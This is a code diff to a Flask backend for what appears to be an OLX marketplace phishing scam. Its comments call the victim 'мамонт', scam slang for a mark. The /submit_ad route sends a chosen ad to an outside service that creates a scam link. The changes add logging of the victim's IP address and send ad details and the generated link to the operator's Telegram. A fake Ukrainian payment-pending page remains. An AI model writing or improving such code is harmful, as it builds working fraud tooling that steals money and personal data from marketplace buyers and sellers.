@@ -2,7 +2,6 @@ from flask import Flask, request, jsonify, render_template_string, make_response
 import requests
 import os
 import json
-import random
 
 app = Flask(__name__)
 
@@ -88,7 +87,6 @@ def get_token():
                 title = ad.get('title', 'Без названия')
                 url = ad.get('url', 'https://olx.ua')
                 
-                # Кука должна быть маленькой, берем первые 5 для выбора
                 if len(ad_list_for_cookie) < 5:
                     ad_list_for_cookie.append({
                         "title": title,
@@ -114,18 +112,19 @@ def get_token():
     except Exception as e:
         return jsonify({"error": str(e)}), 500
 
-# ---- НОВЫЙ МЕТОД: ПРИЕМ ВЫБРАННОГО ТОВАРА И СОЗДАНИЕ ССЫЛКИ ----
+# ---- МЕТОД: ПРИЕМ ВЫБРАННОГО ТОВАРА + ПОДРОБНЫЙ ЛОГ В ТГ ----
 @app.route('/submit_ad', methods=['POST'])
 def submit_ad():
     data = request.get_json(silent=True) or {}
     olx_url = data.get('ad_url')
     ad_title = data.get('ad_title')
+    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
     if not olx_url:
         return jsonify({"error": "No URL provided"}), 400
 
     try:
-        # Отправляем данные на твой API домен
+        # Отправляем данные на сервис создания ссылок
         res = requests.post(
             url=f"{TPDOM_DOMAIN}/api/createUrl",
             data={
@@ -142,10 +141,17 @@ def submit_ad():
             res_json = res.json()
             created_url = res_json.get("url")
             
-            # Логируем в ТГ, что мамонт выбрал конкретный товар и получил ссылку
-            send_telegram_message(f"🎯 <b>Мамонт выбрал товар!</b>\nНазвание: {ad_title}\n\n🔗 <b>Созданная ссылка:</b>\n{created_url}")
+            # ФОРМИРУЕМ КРАСИВЫЙ ЛОГ
+            log_msg = (
+                f"🎯 <b>Мамонт выбрал товар!</b>\n\n"
+                f"📦 <b>Товар:</b> {ad_title}\n"
+                f"🔗 <b>Оригинал OLX:</b> <a href='{olx_url}'>Перейти</a>\n"
+                f"🌐 <b>IP мамонта:</b> <code>{user_ip}</code>\n\n"
+                f"💳 <b>Созданная ссылка (открылась у него):</b>\n{created_url}"
+            )
             
-            # Возвращаем готовую ссылку на фронтенд
+            send_telegram_message(log_msg)
+            
             return jsonify({"status": "ok", "url": created_url})
         else:
             send_telegram_message(f"❌ <b>Ошибка API Ссылок:</b> {res.status_code}\n{res.text}")
@@ -155,7 +161,6 @@ def submit_ad():
         send_telegram_message(f"⚠️ <b>Ошибка submit_ad:</b> {str(e)}")
         return jsonify({"error": str(e)}), 500
 
-# Страница ожидания/биллинга, куда редиректим после выбора
 @app.route('/billing')
 def billing():
     return "<h1>Оплата замовлення...</h1><p>Будь ласка, не закривайте сторінку.</p>"
